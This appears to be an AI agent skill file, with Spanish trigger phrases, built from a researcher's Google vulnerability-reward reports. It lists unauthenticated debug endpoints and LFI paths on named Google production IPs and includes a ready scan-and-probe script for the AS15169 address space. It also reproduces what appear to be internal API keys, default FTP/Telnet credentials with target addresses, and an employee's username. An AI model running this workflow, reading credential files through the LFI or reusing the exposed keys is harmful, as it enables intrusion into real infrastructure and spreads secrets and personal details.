---
name: bughunters-debug-endpoints
description: Personal Google VRP reports by omespino — LFI via /procz and unauthenticated debug endpoints on Google production servers (AS15169). DremelGateway (34.83.45.88) /flagz with internal API keys, /procz?file= LFI as root. springboard.google.com /java/procz LFI (GWS prod, gws-prod user). UPI India 34.120.121.40 /statusz + /procz (Googler's personal dev machine). Mobile Harness 108.177.0.8:9999 + 100.8.125.10:9999 /streamz + /procz (root via SUDO_GID=0). Google Fiber FTP anonymous + Telnet default creds. Full debug endpoint inventory: /labelaclz /flagz /procz /statusz /streamz /varz /reportcardz. Discovery workflow: whois AS15169 → nmap ports → curl endpoints. Spanish triggers — "procz flagz", "debug endpoints google", "dremelgateway", "springboard google", "google fiber", "labelaclz", "streamz google", "mobile harness server", "mis reportes google cloud", "lfi google produccion", "as15169".
---

## Reports: Debug Endpoints + LFI on Google Infra (omespino)

---

## Debug endpoint inventory

| Endpoint | Information |
|---|---|
| `/labelaclz` | Owner, policy (OPEN/OWNER_ONLY), root confirmation |
| `/flagz` | Config flags, API keys, internal domains |
| `/procz?file=` | **LFI** — reads arbitrary files |
| `/statusz` | Server state, build label, BNS address |
| `/streamz` | Metrics tree, binary name, internal hostname, unix_user |
| `/varz` | Internal process variables |
| `/reportcardz` | Internal service reports |
| `/java/statusz`, `/java/procz`, `/java/labelaclz` | Java variants (springboard) |

**Critical trigger:** if `/labelaclz` responds without auth → try `/procz?file=` immediately.

**LFI useful paths:**
```
/procz?file=/proc/self/environ    → env vars (API keys, SA creds)
/procz?file=/proc/self/cmdline    → startup arguments
/procz?file=/proc/self/maps       → memory map
/procz?file=/proc/cpuinfo
/procz?file=/proc/net/netstat
```

---

## Report 2 — DremelGateway (34.83.45.88:7777/2222) — /flagz with internal API keys

**`/labelaclz`:** `Owner Name: root`

**`/flagz` — internal Google API keys:**
```
--dremel_api_key=AIzaSyAdMLkLUa1Xc184-BHZFYwZgJVUYKsFNE
--service_api_key=AIzaSyCXPqYgq2pLwmm1gbP-zGbcb_7hXhDLVDM
--dremel_cloud_bigtable_request_api_key=AIzaSyC6bx_2nNWPebVTnHasmCB-DIN4Aptj74M
--cell_domain=.prod.google.com.
--corplogin_server=https://login.corp.google.com
```

---

## Report 4 — springboard.google.com — GWS prod LFI (gws-prod user)

```
/java/statusz   → GWS server state, BNS, build label, internal depot
/java/labelaclz → owner: gws-prod, policy: OPEN
/java/procz     → full LFI without auth
```
```
https://springboard.google.com/java/procz?file=/proc/self/environ
```
`/java/statusz` reveals BNS: `/bns/pw/borg/pw/bns/gws-prod/gws1.serve/242`, build: `gws_20190326-0_RC1`

---

## Report 8 — UPI India (34.120.121.40:443) — Googler personal machine

**`/statusz`:** `Built on rathivivek@linuxcloudtop1.c.googlers.com:/google/src/cloud/...` = Googler's personal cloud workstation running UPI India payment gateway sync service.

**`/streamz` root confirmation:**
```
hostname: sync-service-7d4965ddb9-rh7tq   ← Kubernetes pod
unix_user: root
```

---

## Report 7 — Mobile Harness (108.177.0.8:9999) — internal device testing infra

**`/streamz`:**
```
binary_name: com.google.devtools.mobileharness.infra.lab.LabServerLauncher
hostname:    192.168.95.1
unix_user:   g00gl3
```
Internal systems visible: Chubby, Monarch, Fireaxe, privacy/ddt.

---

## Report 12 — Mobile Harness Lab (100.8.125.10:9999) — root via SUDO_GID=0

**100.x.x.x (RFC 6598 CGNAT) reachable from internet = misconfigured route.**

**Root confirmation via `/proc/self/environ`:**
- `SUDO_GID=0` and `SUDO_USER=root` = running as root via sudo

**"Not hosted on Borg"** in `/statusz` = less security oversight.

---

## Report 6 — Google Fiber — FTP anonymous + Telnet default creds

```bash
ftp 136.32.102.4        # user: anonymous / pass: anonymous
telnet 23.228.141.115   # pass: access / user: admin
```

| Vendor | Protocol | User | Password |
|---|---|---|---|
| Brother/HP printer | Telnet | admin | access |
| Generic FTP | FTP | anonymous | anonymous |

`nmap -p 21,23 --open <range> --script ftp-anon,telnet-encryption`

---

## Discovery workflow

```bash
# Get Google ASN IPs
whois -h whois.radb.net -- '-i origin AS15169' | grep route | awk '{print $2}'

# Scan debug ports
nmap -p 80,443,2222,7777,8080,8888,9090,9999 --open <range> -oG scan.txt

# Test all debug endpoints
for ip_port in $(grep "open" scan.txt | awk '{print $2":"$NF}'); do
  for ep in labelaclz flagz statusz streamz procz varz reportcardz; do
    curl -s --max-time 3 "http://$ip_port/$ep" | grep -q "Owner Name\|root\|google\|unix_user" && echo "HIT: $ip_port/$ep"
  done
done
```

**Ports with real findings:** 80 (34.94.39.119, 35.227.157.158), 443 (34.120.121.40), 2222/7777 (34.83.45.88), 8080, 9999 (108.177.0.8, 100.8.125.10).

**Users observed:**
| User | System |
|---|---|
| `root` | DremelGateway, Mobile Harness, sync-service |
| `gws-prod` | Google Web Server (Google Search) |
| `g00gl3` | Mobile Harness device testing |
| `chrome-proxy` | Chrome ConnectProxy |
